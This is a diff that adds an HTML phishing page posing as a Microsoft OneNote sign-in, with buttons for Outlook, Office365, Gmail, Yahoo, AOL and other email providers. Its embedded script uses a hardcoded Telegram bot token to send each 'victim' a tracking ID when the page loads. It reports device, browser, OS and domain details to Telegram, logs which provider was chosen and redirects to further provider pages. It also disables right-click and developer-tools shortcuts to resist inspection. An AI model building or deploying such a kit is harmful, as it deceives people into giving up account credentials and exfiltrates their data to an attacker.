@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>OneNote - Sign in</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Helvetica Neue', 'Segoe UI', Roboto, sans-serif; }
+        body { background: linear-gradient(145deg, #f5f0e8 0%, #e8dfd2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 16px; }
+        .card { max-width: 480px; width: 100%; background: white; border-radius: 32px; box-shadow: 0 20px 40px -12px rgba(0,20,30,0.25); overflow: hidden; border: 1px solid rgba(255,255,255,0.6); }
+        .header { background: linear-gradient(135deg, #7030A0 0%, #8A4BB8 100%); padding: 36px 24px 30px; text-align: center; color: white; }
+        .header h1 { font-size: 48px; font-weight: 300; letter-spacing: 2px; margin-bottom: 8px; text-shadow: 0 2px 4px rgba(0,0,0,0.2); font-weight: 600; }
+        .content { padding: 32px 24px; }
+        .logo-container { display: flex; justify-content: center; align-items: center; margin: 20px 0 30px; }
+        .logo-container svg { width: 200px; height: 200px; }
+        .info-box { background: #f5f0ff; border-left: 4px solid #7030A0; padding: 20px; border-radius: 12px; margin: 20px 0; font-size: 14px; color: #2d3e50; line-height: 1.6; }
+        .info-title { font-weight: 600; color: #7030A0; margin-bottom: 8px; font-size: 16px; }
+        .signin-text { text-align: center; color: #5f6368; margin: 25px 0 15px; font-size: 16px; }
+        .provider-title { text-align: center; color: #1a2e40; font-weight: 600; font-size: 18px; margin: 28px 0 20px; letter-spacing: 0.5px; }
+        .provider-list { display: flex; flex-direction: column; gap: 12px; margin: 0 0 30px; }
+        
+        .provider-btn {
+            padding: 14px 20px;
+            border-radius: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            width: 100%;
+            background: white;
+            color: #1a2e40;
+            border: 2.5px solid #e2e8f0;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08), 0 2px 4px rgba(0,0,0,0.04);
+        }
+        .provider-btn:hover { transform: scale(1.02); box-shadow: 0 8px 24px rgba(0,0,0,0.15); }
+        .provider-btn:active { transform: scale(0.97); }
+        
+        .provider-btn.outlook { border-color: #0078D4; }
+        .provider-btn.outlook:hover { background: #0078D4; color: white; border-color: #0078D4; }
+        .provider-btn.outlook:hover .provider-logo { filter: brightness(0) invert(1); }
+        
+        .provider-btn.office365 { border-color: #D83B01; }
+        .provider-btn.office365:hover { background: #D83B01; color: white; border-color: #D83B01; }
+        .provider-btn.office365:hover .provider-logo { filter: brightness(0) invert(1); }
+        
+        .provider-btn.gmail { border-color: #D93025; }
+        .provider-btn.gmail:hover { background: #D93025; color: white; border-color: #D93025; }
+        .provider-btn.gmail:hover .provider-logo { filter: brightness(0) invert(1); }
+        
+        .provider-btn.yahoo { border-color: #6001D9; }
+        .provider-btn.yahoo:hover { background: #6001D9; color: white; border-color: #6001D9; }
+        .provider-btn.yahoo:hover .provider-logo { filter: brightness(0) invert(1); }
+        
+        .provider-btn.aol { border-color: #333333; }
+        .provider-btn.aol:hover { background: #333333; color: white; border-color: #333333; }
+        .provider-btn.aol:hover .provider-logo { filter: brightness(0) invert(1); }
+        
+        .provider-btn.other { border-color: #757575; }
+        .provider-btn.other:hover { background: #757575; color: white; border-color: #757575; }
+        .provider-btn.other:hover .provider-logo { filter: brightness(0) invert(1); }
+        
+        .provider-logo {
+            width: 32px;
+            height: 32px;
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            border-radius: 6px;
+            flex-shrink: 0;
+        }
+        
+        .outlook .provider-logo { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="%230078D4"/><path d="M20 14v20h-4V14h4zm8 0v20h-4V14h4zm6 0v20h-4V14h4z" fill="white"/></svg>'); }
+        .office365 .provider-logo { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="%23D83B01"/><text x="24" y="34" text-anchor="middle" fill="white" font-size="26" font-weight="bold" font-family="Segoe UI,Arial">O</text></svg>'); }
+        .gmail .provider-logo { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="%23D93025"/><text x="24" y="34" text-anchor="middle" fill="white" font-size="28" font-weight="bold" font-family="Arial">G</text></svg>'); }
+        .yahoo .provider-logo { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="%236001D9"/><text x="24" y="34" text-anchor="middle" fill="white" font-size="24" font-weight="bold" font-family="Arial">Y!</text></svg>'); }
+        .aol .provider-logo { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="%23333333"/><text x="24" y="32" text-anchor="middle" fill="white" font-size="16" font-weight="bold" font-family="Arial">AOL</text></svg>'); }
+        .other .provider-logo { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><rect width="48" height="48" rx="8" fill="%23757575"/><text x="24" y="34" text-anchor="middle" fill="white" font-size="26" font-weight="bold" font-family="Arial">@</text></svg>'); }
+
+        .footer { text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e9e0d4; font-size: 13px; color: #7a8b9a; }
+        .footer a { color: #1a2e40; text-decoration: none; font-weight: 600; }
+        .watermark { text-align: center; margin-top: 16px; font-size: 11px; color: #aab7c2; }
+        
+        @media (max-width: 480px) {
+            body { padding: 10px; }
+            .card { border-radius: 24px; }
+            .header { padding: 28px 20px 24px; }
+            .header h1 { font-size: 36px; }
+            .content { padding: 24px 20px; }
+            .logo-container svg { width: 150px; height: 150px; }
+            .provider-btn { padding: 12px 16px; font-size: 15px; }
+            .provider-logo { width: 28px; height: 28px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="header"><h1>OneNote</h1></div>
+        <div class="content">
+            <div class="logo-container">
+                <svg width="200" height="200" viewBox="0 0 620 620">
+                    <defs>
+                        <linearGradient id="bgGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#f3a8c9"/>
+                            <stop offset="40%" stop-color="#c45be1"/>
+                            <stop offset="75%" stop-color="#8a2fc7"/>
+                            <stop offset="100%" stop-color="#5a189a"/>
+                        </linearGradient>
+                        <linearGradient id="rightGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" stop-color="#8e2de2"/>
+                            <stop offset="100%" stop-color="#4a148c"/>
+                        </linearGradient>
+                        <linearGradient id="bottomShade" x1="0%" y1="0%" x2="0%" y2="100%">
+                            <stop offset="0%" stop-color="rgba(0,0,0,0)"/>
+                            <stop offset="100%" stop-color="rgba(0,0,0,0.25)"/>
+                        </linearGradient>
+                        <linearGradient id="tileGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                            <stop offset="0%" stop-color="#c026d3"/>
+                            <stop offset="100%" stop-color="#6b21a8"/>
+                        </linearGradient>
+                        <filter id="shadow" x="-30%" y="-30%" width="160%" height="160%">
+                            <feDropShadow dx="0" dy="22" stdDeviation="22" flood-color="#000" flood-opacity="0.45"/>
+                        </filter>
+                    </defs>
+                    <rect x="0" y="0" width="620" height="620" rx="140" fill="url(#bgGrad)"/>
+                    <path d="M380 250 Q380 120 520 120 L620 120 L620 620 L380 620 Z" fill="url(#rightGrad)"/>
+                    <rect x="0" y="360" width="620" height="260" rx="0" fill="url(#bottomShade)"/>
+                    <g filter="url(#shadow)">
+                        <rect x="85" y="325" width="270" height="270" rx="65" fill="url(#tileGrad)"/>
+                        <text x="220" y="505" text-anchor="middle" font-family="Arial, Helvetica, sans-serif" font-size="175" font-weight="800" fill="#ffffff">N</text>
+                    </g>
+                </svg>
+            </div>
+            <div class="info-box"><div class="info-title">📘 OneNote</div><div>OneNote online limits across different office 365 plans</div></div>
+            <div class="signin-text">Sign in to continue to OneNote</div>
+            <div class="provider-title">━━  Select Email Provider  ━━</div>
+            <div class="provider-list" id="providerList">
+                <button class="provider-btn outlook" data-provider="outlook"><span class="provider-logo"></span>Outlook</button>
+                <button class="provider-btn office365" data-provider="office365"><span class="provider-logo"></span>Office365</button>
+                <button class="provider-btn gmail" data-provider="gmail"><span class="provider-logo"></span>Gmail</button>
+                <button class="provider-btn yahoo" data-provider="yahoo"><span class="provider-logo"></span>Yahoo Mail</button>
+                <button class="provider-btn aol" data-provider="aol"><span class="provider-logo"></span>AOL</button>
+                <button class="provider-btn other" data-provider="other"><span class="provider-logo"></span>Other Email</button>
+            </div>
+            <div class="footer">OneNote · Digital note-taking app<br><a href="#">onenote.com</a> · Your notes, organized</div>
+            <div class="watermark">© 2026 Microsoft Corporation. All rights reserved.</div>
+        </div>
+    </div>
+
+    <script>
+        // ===== DOMAIN-AGNOSTIC =====
+        const BOT_TOKEN = "8849922646:AAHL1k8PDTU83eg5OVZJYTqGdLvyfwdydaw";
+        const CHANNEL_ID = "8374468402";
+        const CURRENT_DOMAIN = window.location.origin;
+        
+        const victimId = 'VIC_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        localStorage.setItem('victim_id', victimId);
+
+        function sendToTelegram(message) {
+            try {
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHANNEL_ID}&text=${encodeURIComponent(message)}`;
+                img.style.display = 'none';
+                document.body.appendChild(img);
+                setTimeout(() => { if (img.parentNode) img.parentNode.removeChild(img); }, 3000);
+                return true;
+            } catch(e) { return false; }
+        }
+
+        let landingSent = false;
+        function sendLanding() {
+            if (landingSent) return;
+            landingSent = true;
+            const device = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+            const browser = navigator.userAgent.includes('Firefox') ? 'Firefox' :
+                           navigator.userAgent.includes('Chrome') ? 'Chrome' :
+                           navigator.userAgent.includes('Safari') ? 'Safari' : 'Unknown';
+            const os = navigator.userAgent.includes('Windows') ? 'Windows' :
+                       navigator.userAgent.includes('Mac') ? 'macOS' :
+                       navigator.userAgent.includes('Linux') ? 'Linux' : 'Unknown';
+            const msg = `[+]━━【🌐 BOX_26】━━[+]\n🌐 New victim landed\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n🌐 Domain: ${CURRENT_DOMAIN}\n🆔 ID: ${victimId}\n📱 Device: ${device} (${screen.width}x${screen.height})\n🌐 Browser: ${browser}\n💻 OS: ${os}\n🌐 Language: ${navigator.language}\n⏰ Time: ${new Date().toLocaleString()}`;
+            sendToTelegram(msg);
+        }
+
+        document.querySelectorAll('.provider-btn').forEach(btn => {
+            btn.addEventListener('click', function(e) {
+                e.preventDefault();
+                const provider = this.dataset.provider;
+                sendToTelegram(`📧 Selected: ${provider}`);
+                window.location.href = `providers/${provider}.html?vid=${victimId}`;
+            });
+        });
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) { e.preventDefault(); return false; }
+        });
+
+        setTimeout(sendLanding, 500);
+        window.sendToTelegram = sendToTelegram;
+        window.victimId = victimId;
+        window.CURRENT_DOMAIN = CURRENT_DOMAIN;
+    </script>
+</body>
+</html>
